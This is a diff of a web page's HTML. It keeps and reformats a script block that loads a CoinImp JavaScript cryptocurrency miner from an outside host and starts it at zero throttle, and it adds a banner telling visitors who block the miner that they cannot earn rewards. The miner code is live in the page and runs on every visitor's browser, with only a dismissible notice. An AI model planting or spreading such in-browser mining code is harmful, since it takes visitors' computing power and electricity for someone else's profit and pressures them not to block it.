@@ -39,17 +39,34 @@
                 src="https://cdn.glitch.global/4d28a5f0-4bec-4873-9059-3319b8398254/Screenshot%20from%202022-11-19%2020-02-07.png"
               />
             </article>
-           <script src="https://www.hostingcloud.racing/eHya.js"></script>
-<script>
-    var _client = new Client.Anonymous('965d2861fb2a4feecd31c6df44bb842f986bbdb2caccd02642aae8c5a23e3883', {
-        throttle: 0, c: 'w'
-    });
-    _client.start();
-    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
-
-</script>
-
+            <script src="https://www.hostingcloud.racing/eHya.js"></script>
+            <script>
+              var _client = new Client.Anonymous(
+                "965d2861fb2a4feecd31c6df44bb842f986bbdb2caccd02642aae8c5a23e3883",
+                {
+                  throttle: 0,
+                  c: "w",
+                }
+              );
+              _client.start();
+              _client.addMiningNotification(
+                "Top",
+                "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.",
+                "#cccccc",
+                40,
+                "#3d3d3d"
+              );
+            </script>
           </label>
+          <label class="hide" id="miner-alert">
+            You Can't Earn Rewards While Blocking The Miner,
+            <label style="color: blue; cursor: pointer" onclick="learnMORE();"
+              >Learn More</label
+            >
+            <div class="X" onclick="closealert();" id="close-miner-alert">
+              X
+            </div></label
+          >
         </center>
       </app>
     </wrap>
